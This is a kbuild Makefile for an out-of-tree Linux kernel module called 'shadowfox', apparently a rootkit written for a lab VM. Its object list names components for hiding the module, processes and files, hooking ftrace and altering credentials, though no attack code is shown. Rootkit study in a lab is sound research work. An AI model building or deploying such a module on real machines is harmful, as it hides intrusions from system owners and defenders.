# SPDX-License-Identifier: GPL-2.0
#
# Out-of-tree build for the shadowfox kernel module.
#
# Dual-mode Makefile: the same file is read twice during a build.
#
#   1. First, invoked from the command line — KERNELRELEASE is empty,
#      so we take the `else` branch and shell out to the kernel build
#      system at $(KDIR).
#   2. The kernel build system then re-includes this Makefile with
#      KERNELRELEASE set, and we expose obj-m / shadowfox-y so kbuild
#      knows what to build and how to link the objects.
#
# Build (from inside the lab VM, against the running kernel):
#   make            # all objects -> shadowfox.ko
#   make clean      # remove build artefacts
#
# Stage 1 sources:
#   main.o     - module init/exit
#   symbols.o  - kprobe-based kallsyms resolver

ifneq ($(KERNELRELEASE),)

obj-m		:= shadowfox.o
shadowfox-y	:= main.o symbols.o hide_module.o cred.o ftrace_hook.o hide_proc.o hide_files.o

# Tighten warnings on our own translation units. -Werror is intentionally
# left off for now; will be revisited at the end of Stage 1 once every
# source file in the module has been written.
ccflags-y	+= -Wextra -Wno-unused-parameter

else

KDIR ?= /lib/modules/$(shell uname -r)/build
PWD  := $(CURDIR)

.PHONY: all clean

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

endif
